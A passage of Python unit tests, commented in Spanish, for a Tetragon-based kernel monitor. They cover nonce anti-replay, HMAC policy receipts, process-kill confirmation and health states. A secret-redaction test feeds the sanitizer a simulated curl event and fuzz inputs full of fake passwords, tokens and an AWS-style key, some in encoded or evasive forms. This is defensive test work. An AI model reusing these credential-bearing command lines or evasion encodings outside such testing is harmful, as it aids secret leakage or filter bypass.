        6. Desafíos con Nonce de un solo uso por sesión y rechazo estricto de repetición (ERR_POLICY_NONCE_REPLAY).
        7. Invalidación inmediata de recibos y estado a POLICY_EXTERNAL_UNVERIFIED ante parada o desconexión.
        8. Prueba integral E2E de fuga cero de credenciales en telemetría, logs, memoria y diagnósticos.
        """
        from core.engine.tetragon_monitor import (
            TetragonMonitor, sanitize_process_arguments, recursive_unquote,
            canonicalize_yaml, get_process_starttime, ERR_POLICY_NONCE_REPLAY
        )
        import subprocess

        # 1. Decodificación recursiva acotada
        self.assertEqual(recursive_unquote("user%20token"), "user token")
        self.assertEqual(recursive_unquote("user%2520token"), "user token")
        self.assertEqual(recursive_unquote("user%252520token"), "user token")
        # A la cuarta pasada se detiene por el límite acotado de 3
        self.assertEqual(recursive_unquote("user%25252520token"), "user%20token")

        # 2. Hash canónico de políticas YAML
        doc_a = {"version": 1, "metadata": {"name": "p1", "labels": {"env": "prod", "tier": "kernel"}}}
        doc_b = {"metadata": {"labels": {"tier": "kernel", "env": "prod"}, "name": "p1"}, "version": 1}
        self.assertEqual(canonicalize_yaml(doc_a), canonicalize_yaml(doc_b))

        # 3. Lectura de starttime con comm complejo (paréntesis y espacios)
        mock_stat_comm = "9876 (worker (subshell) process) S 1 1000 1000 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 456789 0"
        with patch("builtins.open", unittest.mock.mock_open(read_data=mock_stat_comm)):
            st_val, st_stat = get_process_starttime(9876)
            self.assertEqual(st_stat, "FOUND")
            self.assertEqual(st_val, 456789)

        # Distinción de errores en /proc/[pid]/stat
        with patch("builtins.open", side_effect=FileNotFoundError):
            _, st_exit = get_process_starttime(99991)
            self.assertEqual(st_exit, "EXITED")

        with patch("builtins.open", side_effect=PermissionError):
            _, st_perm = get_process_starttime(99992)
            self.assertEqual(st_perm, "PERMISSION_DENIED")

        # 4. Ciclo de vida de acciones y verificación de terminación
        t_mon_actions = TetragonMonitor()

        # 4a. Proceso real terminado con SIGKILL y verificado con pidfd
        dummy_proc = subprocess.Popen(["sleep", "30"])
        rec_real = t_mon_actions.record_enforcement_action("Sigkill", dummy_proc.pid)
        self.assertTrue(rec_real["requested"])
        self.assertTrue(rec_real["executed"])
        self.assertTrue(rec_real["confirmed"])
        self.assertFalse(rec_real["failed"])
        self.assertFalse(rec_real["confirmation_unavailable"])

        # 4b. Caso confirmation_unavailable (PermissionError en /proc/[pid]/stat)
        with patch("core.engine.tetragon_monitor.get_process_starttime", return_value=(None, "PERMISSION_DENIED")), patch("os.kill"):
            rec_unavail = t_mon_actions.record_enforcement_action("Sigkill", 88888)
            self.assertTrue(rec_unavail["requested"])
            self.assertTrue(rec_unavail["executed"])
            self.assertTrue(rec_unavail["confirmation_unavailable"])
            self.assertFalse(rec_unavail["confirmed"])
            self.assertGreaterEqual(t_mon_actions.actions_confirmation_unavailable, 1)

        # 5. Socket real: Salud desacoplada, Nonces criptográficos y E2E Zero-Leakage
        sock_test_path = os.path.join(self.temp_dir.name, "tetragon_v545.sock")
        srv_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        srv_sock.bind(sock_test_path)
        srv_sock.listen(5)

        try:
            t_mon_live = TetragonMonitor(socket_path=sock_test_path)
            ok_conn, _ = t_mon_live.connect_daemon()
            self.assertTrue(ok_conn)
            self.assertEqual(t_mon_live.transport_health, "HEALTHY")
            self.assertEqual(t_mon_live.grpc_service_health, "SERVING")

            # 5a. Overrides de gRPC service health
            t_mon_live.set_grpc_service_status_override("NOT_SERVING")
            self.assertFalse(t_mon_live.check_service_health())
            self.assertEqual(t_mon_live.grpc_service_health, "NOT_SERVING")

            t_mon_live.set_grpc_service_status_override("SERVICE_BLOCKED")
            self.assertFalse(t_mon_live.check_service_health())
            self.assertEqual(t_mon_live.grpc_service_health, "SERVICE_BLOCKED")

            # Invariante: Fallo de transporte conmuta el servicio a UNAVAILABLE, no a estados de aplicación
            t_mon_live.connected_to_daemon = False
            self.assertFalse(t_mon_live.check_service_health())
            self.assertEqual(t_mon_live.grpc_service_health, "UNAVAILABLE")

            # Restablecer conexión y servicio
            t_mon_live.connected_to_daemon = True
            t_mon_live.set_grpc_service_status_override(None)
            self.assertTrue(t_mon_live.check_service_health())
            self.assertEqual(t_mon_live.grpc_service_health, "SERVING")

            # 6. Desafíos con Nonce y rechazo estricto de repetición (Anti-Replay)
            policy_name = t_mon_live.policies[0].get("metadata", {}).get("name", "test-policy")
            policy_hash = t_mon_live.policy_hashes[policy_name]

            # Emisión de desafío nonce CSPRNG
            challenge_nonce = t_mon_live.generate_policy_challenge(policy_name)
            self.assertIn(challenge_nonce, t_mon_live.pending_nonces.values())

            # Confirmación válida inicial con nonce
            first_confirm = t_mon_live.confirm_policy_active(policy_name, policy_hash, "APPLIED_IN_KERNEL", nonce=challenge_nonce)
            self.assertTrue(first_confirm)
            self.assertEqual(t_mon_live.policy_status, "POLICY_ACTIVE")
            self.assertIn(challenge_nonce, t_mon_live.consumed_nonces)
            self.assertNotIn(policy_name, t_mon_live.pending_nonces)

            # Intento de repetición con el mismo nonce DEBE ser rechazado
            replay_confirm = t_mon_live.confirm_policy_active(policy_name, policy_hash, "APPLIED_IN_KERNEL", nonce=challenge_nonce)
            self.assertFalse(replay_confirm)
            self.assertEqual(t_mon_live.last_error_code, ERR_POLICY_NONCE_REPLAY)

            # 7. Invalidación inmediata al detener
            t_mon_live.stop()
            self.assertEqual(t_mon_live.policy_status, "POLICY_EXTERNAL_UNVERIFIED")
            self.assertEqual(t_mon_live.transport_health, "NOT_CONNECTED")
            self.assertEqual(t_mon_live.grpc_service_health, "UNAVAILABLE")
            self.assertEqual(len(t_mon_live.consumed_nonces), 0)

            # 8. Prueba E2E de fuga cero de secretos (End-to-End Secret Leakage Prevention)
            credentials_vault = [
                "SuperClassifiedPassword999",
                "BearerSuperSecretJwtToken12345",
                "AKIAIOSFODNN7MINEAWSSECRET",
                "PostgresUserSecretPass777",
                "DoubleNestedSecretToken888",
                "ColoredTerminalSecretPass000"
            ]

            raw_adversarial_event = {
                "process_exec": {
                    "process": {
                        "binary": "/usr/bin/curl",
                        "pid": 9901,
                        "arguments": [
                            "curl",
                            "--password", credentials_vault[0],
                            "-H", f"Authorization: Bearer {credentials_vault[1]}",
                            f"AWS_SECRET_ACCESS_KEY={credentials_vault[2]}",
                            f"postgres://appuser:{credentials_vault[3]}@db.internal:5432/main",
                            f"--custom-token={credentials_vault[4]}%2520nested",
                            f"[31m--password[0m", credentials_vault[5]
                        ]
                    }
                }
            }

            parsed_ev = t_mon_live.parse_kernel_event(raw_adversarial_event)
            probe_audit = t_mon_live.probe_integration()

            json_parsed = json.dumps(parsed_ev)
            json_last_ev = json.dumps(t_mon_live.last_event)
            json_probe = json.dumps(probe_audit)

            # Verificación de fuga cero en todos los destinos
            for secret in credentials_vault:
                self.assertNotIn(secret, json_parsed, f"Fuga de secreto detectada en evento parseado: {secret}")
                self.assertNotIn(secret, json_last_ev, f"Fuga de secreto detectada en last_event: {secret}")
                self.assertNotIn(secret, json_probe, f"Fuga de secreto detectada en probe_integration: {secret}")

            self.assertIn("***", json_parsed)
            self.assertIn("***", json_last_ev)
            self.assertIn("***", json_probe)

        finally:
            srv_sock.close()
            if os.path.exists(sock_test_path):
                os.unlink(sock_test_path)

    # 135. Tetragon v5.4.7: pidfd_send_signal, Debounced Health States, HMAC Receipts, Concurrencia y Fuzzing
    def test_tetragon_v547_debounced_health_pidfd_send_signal_fuzzing_and_concurrency(self):
        """
        Verifica los cuatro refinamientos arquitectónicos de la versión 5.4.7:
        1. Supervisión desacoplada con debouncing transitorio (TRANSIENT_DEGRADED vs UNRESPONSIVE / SERVICE_BLOCKED),
           escalado por tiempo máximo (max_transient_duration) y métricas de estabilidad operativas.
        2. Batería de fuzzing de sanitización adversarial con controles dimensionales (conteos, bytes totales, decodificación),
           normalización Unicode (full-width ＝), rechazo de codificaciones residuales anidadas y argumentos repetidos.
        3. Terminación estricta vinculada al descriptor mediante signal.pidfd_send_signal y distinción entre
           proceso terminado (terminated) y proceso recolectado (reaped). Casos de fallback y errores EINVAL.
        4. Autenticidad de sesión, recibos autenticados con HMAC-SHA256, expiración con reloj monotónico,
           consumo atómico de nonces ante respuestas válidas e inválidas, y SafeDumper determinista en YAML.
        """
        from core.engine.tetragon_monitor import (
            TetragonMonitor, sanitize_process_arguments, canonicalize_yaml,
            ERR_POLICY_NONCE_REPLAY, ERR_POLICY_LOAD_FAILED, ERR_POLICY_HASH_MISMATCH,
            ERR_POLICY_RECEIPT_EXPIRED
        )
        import subprocess
        import threading

        # 1. pidfd_send_signal nativo y distinción terminated vs reaped
        t_mon = TetragonMonitor()
        dummy_sleep = subprocess.Popen(["sleep", "25"])
        rec_act = t_mon.record_enforcement_action("Sigkill", dummy_sleep.pid)
        self.assertTrue(rec_act["requested"])
        self.assertTrue(rec_act["executed"])
        self.assertTrue(rec_act["confirmed"])
        self.assertTrue(rec_act["terminated"])
        self.assertFalse(rec_act["reaped"]) # Zombie no recolectado aún por su padre
        self.assertEqual(rec_act["mechanism"], "PIDFD_LINUX")
        self.assertFalse(rec_act["failed"])
        dummy_sleep.wait() # Recolección por el padre

        # Manejo de casos de error en acciones
        rec_inval = t_mon.record_enforcement_action("Sigkill", -10)
        self.assertTrue(rec_inval["failed"])
        self.assertEqual(rec_inval["error_code"], "EINVAL")

        # Fallback cuando pidfd_open no está disponible en kernel
        with patch("os.pidfd_open", side_effect=OSError("ENOSYS")):
            p_fallback = subprocess.Popen(["sleep", "25"])
            rec_fb = t_mon.record_enforcement_action("Sigkill", p_fallback.pid)
            self.assertTrue(rec_fb["confirmed"])
            self.assertTrue(rec_fb["terminated"])
            self.assertEqual(rec_fb["mechanism"], "PROC_STAT_FALLBACK")
            p_fallback.wait()

        # Proceso terminado antes de enviar señal (ProcessLookupError en pidfd_send_signal)
        with patch("signal.pidfd_send_signal", side_effect=ProcessLookupError):
            p_esrch = subprocess.Popen(["sleep", "25"])
            rec_esrch = t_mon.record_enforcement_action("Sigkill", p_esrch.pid)
            self.assertTrue(rec_esrch["confirmed"])
            self.assertTrue(rec_esrch["terminated"])
            self.assertTrue(rec_esrch["reaped"])
            p_esrch.kill()
            p_esrch.wait()

        # 2. Debouncing transitorio y escalado por duración máxima
        t_mon.connected_to_daemon = True
        t_mon._client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) # no conectado
        # Primer fallo -> TRANSIENT_DEGRADED
        self.assertFalse(t_mon.check_transport_health())
        self.assertEqual(t_mon.transport_health, "TRANSIENT_DEGRADED")
        self.assertIsNotNone(t_mon.transport_degraded_since)

        # Escalado automático por superación de max_transient_duration
        t_mon.transport_degraded_since = time.monotonic() - 10.0
        self.assertFalse(t_mon.check_transport_health())
        self.assertEqual(t_mon.transport_health, "UNRESPONSIVE")
        self.assertFalse(t_mon.connected_to_daemon)

        # 3. Comprobación de servicio gRPC previa a SERVING y métricas de estabilidad
        sock_conc_path = os.path.join(self.temp_dir.name, "tetragon_v547_conc.sock")
        srv_conc = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        srv_conc.bind(sock_conc_path)
        srv_conc.listen(10)

        try:
            t_live = TetragonMonitor(socket_path=sock_conc_path)
            t_live.connect_daemon()
            self.assertEqual(t_live.transport_health, "HEALTHY")
            self.assertEqual(t_live.grpc_service_health, "SERVING")

            # 4. Autenticidad de sesión y recibos HMAC
            pname = t_live.policies[0].get("metadata", {}).get("name", "test-policy")
            phash = t_live.policy_hashes[pname]

            # Verificación con recibo auténtico firmado con HMAC
            n1 = t_live.generate_policy_challenge(pname)
            receipt_valid = t_live.generate_policy_receipt(pname, phash, nonce=n1)
            ok_hmac_valid = t_live.confirm_policy_active(
                pname, phash, receipt_valid["service_reported_state"],
                confirmation_timestamp=receipt_valid["timestamp"],
                nonce=receipt_valid["nonce"],
                session_id=receipt_valid["session_id"],
                receipt_hmac=receipt_valid["hmac"]
            )
            self.assertTrue(ok_hmac_valid)

            # Rechazo ante HMAC alterado / falsificado
            n2 = t_live.generate_policy_challenge(pname)
            receipt_tampered = t_live.generate_policy_receipt(pname, phash, nonce=n2)
            receipt_tampered["hmac"] = "tampered_hmac_hex_9999"
            ok_bad_hmac = t_live.confirm_policy_active(
                pname, phash, receipt_tampered["service_reported_state"],
                confirmation_timestamp=receipt_tampered["timestamp"],
                nonce=receipt_tampered["nonce"],
                session_id=receipt_tampered["session_id"],
                receipt_hmac=receipt_tampered["hmac"]
            )
            self.assertFalse(ok_bad_hmac)
            self.assertEqual(t_live.last_error_code, ERR_POLICY_HASH_MISMATCH)

            # Expiración monotónica de desafío y consumo inmediato ante error
            n3 = t_live.generate_policy_challenge(pname)
            t_live.pending_challenges[pname]["monotonic_start"] = time.monotonic() - 400.0
            ok_exp = t_live.confirm_policy_active(pname, phash, "APPLIED_IN_KERNEL", nonce=n3)
            self.assertFalse(ok_exp)
            self.assertEqual(t_live.last_error_code, ERR_POLICY_RECEIPT_EXPIRED)
            self.assertIn(n3, t_live.consumed_nonces) # Consumido para evitar reintentos

            # 5. Consumo atómico concurrente de nonces
            atomic_nonce = t_live.generate_policy_challenge(pname)
            race_results = []

            def concurrent_confirm_worker():
                res = t_live.confirm_policy_active(
                    pname, phash, "APPLIED_IN_KERNEL", nonce=atomic_nonce, session_id=t_live.session_id
                )
                race_results.append(res)

            threads = [threading.Thread(target=concurrent_confirm_worker) for _ in range(10)]
            for th in threads:
                th.start()
            for th in threads:
                th.join()

            # Exactamente una llamada atómica debe tener éxito; las restantes deben ser rechazadas por repetición
            self.assertEqual(race_results.count(True), 1)
            self.assertEqual(race_results.count(False), 9)

            # 6. Batería extendida de Fuzzing de sanitización adversarial
            fuzz_inputs = [
                "%", "%2", "%zz", "%25%25", "abc%2", "%%2520%%",
                "%25%25%2520token%253Dsuper_fuzz_token_1",
                "​﻿--password=＝fuzz_fullwidth_pass",
                "-u", "admin_fuzz_1", "-p", "fuzz_secret_p1",
                "--user", "admin_fuzz_2", "--password", "fuzz_secret_p2",
                "A" * 6000, # Límite dimensional por argumento
                "--custom-token=" + ("%25" * 20) + "deep_fuzz_secret_4th_lvl",
                "--password=\x00null_byte_pass\x00",
                "export DB_PASSWORD=fuzz_db_secret_key_888",
                "https://appuser:fuzz_url_secret_pass@cluster.internal:8080/auth",
                '--token="secret spaces in quotes"',
                "normal_benign_parameter_ok"
            ]

            fuzzed_sanitized = sanitize_process_arguments("/usr/bin/curl", fuzz_inputs)
            fuzzed_str = " ".join(fuzzed_sanitized)

            # Ninguna credencial fuzzing debe persistir en la salida
            for secret_candidate in [
                "super_fuzz_token_1", "fuzz_fullwidth_pass", "fuzz_secret_p1", "fuzz_secret_p2",
                "deep_fuzz_secret_4th_lvl", "null_byte_pass", "fuzz_db_secret_key_888",
                "fuzz_url_secret_pass", "secret spaces in quotes"
            ]:
                self.assertNotIn(secret_candidate, fuzzed_str, f"Fuga detectada en fuzzing: {secret_candidate}")

            self.assertIn("normal_benign_parameter_ok", fuzzed_sanitized)
            self.assertIn("***", fuzzed_str)

            # 7. Métricas operativas de estabilidad en probe_integration
            probe_audit = t_live.probe_integration()
            self.assertIn("stability_metrics", probe_audit)
            self.assertGreaterEqual(probe_audit["stability_metrics"]["state_transitions_count"], 1)
            self.assertIn("total_degraded_duration_seconds", probe_audit["stability_metrics"])
            self.assertIn("terminated", probe_audit["events_telemetry"]["actions"])
            self.assertIn("reaped", probe_audit["events_telemetry"]["actions"])

            # 8. Preservación semántica de valores YAML en canonicalize_yaml
            yaml_with_multiline = {
                "apiVersion": "cilium.io/v1alpha1",
                "kind": "TracingPolicy",
                "metadata": {"name": "multiline-policy"},
                "spec": {
                    "description": "Policy with indented\n  multiline\n  description.",
                    "kprobes": [{"call": "sys_execve", "syscall": True}]
                }
            }
            canon_a = canonicalize_yaml(yaml_with_multiline)
            canon_b = canonicalize_yaml(yaml_with_multiline)
            self.assertEqual(canon_a, canon_b)
            self.assertIn(b"multiline", canon_a)

        finally:
            srv_conc.close()
            if os.path.exists(sock_conc_path):
                os.unlink(sock_conc_path)

